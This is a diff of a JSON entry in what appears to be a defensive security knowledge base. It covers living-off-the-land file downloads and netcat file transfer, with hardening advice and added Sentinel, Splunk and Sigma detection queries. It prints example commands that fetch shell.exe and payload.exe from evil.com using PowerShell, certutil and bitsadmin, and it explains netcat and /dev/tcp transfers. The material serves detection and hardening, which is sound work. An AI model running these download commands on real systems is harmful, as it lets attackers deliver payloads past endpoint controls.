@@ -98,7 +98,63 @@
     ],
     "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
     "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
-    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'",
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Netcat / Ncat - File Transfer - Sentinel",
+        "logic": "DeviceProcessEvents\n| where FileName in~ (\"nc\",\"ncat\",\"nc.exe\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine\n| union (DeviceNetworkEvents | where InitiatingProcessFileName in~ (\"nc\",\"ncat\") | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, ProcessCommandLine=strcat(RemoteIP, \":\", tostring(RemotePort)))\n| sort by Timestamp desc\n// raw TCP file transfer on an unusual port; plain nc is inspectable",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "splunk",
+        "name": "Netcat / Ncat - File Transfer (1) - Splunk",
+        "logic": "index=linux sourcetype=\"linux:auditd\" (comm=\"nc\" OR comm=\"ncat\")\n| table _time, host, auid, proctitle",
+        "data_source": "linux-audit",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "splunk",
+        "name": "Netcat / Ncat - File Transfer (2) - Splunk",
+        "logic": "index=sysmon EventCode=3 Image=\"*nc*\"\n| table _time, Computer, DestinationIp, DestinationPort",
+        "data_source": "sysmon",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "3"
+        ]
+      },
+      {
+        "platform": "sigma",
+        "name": "proc_creation_netcat_file_transfer",
+        "logic": "proc_creation_netcat_file_transfer",
+        "data_source": "sysmon",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      }
+    ],
+    "visibility": {
+      "requires": [
+        "defender-endpoint",
+        "linux-audit",
+        "sysmon"
+      ]
+    }
   },
   "explain": "Moves a file over a raw TCP socket with netcat when no HTTP/SMB is available:\n  nc -l -p 8000 > out.exe   receiver: listen on 8000 and write incoming bytes to a file\n  nc -q 0 <ip> 8000 < out.exe   sender: connect and stream the file, then quit on EOF (-q 0)\nStart the receiver first; the file transfers with no protocol overhead (cat < /dev/tcp/... can receive without any nc binary)."
 }
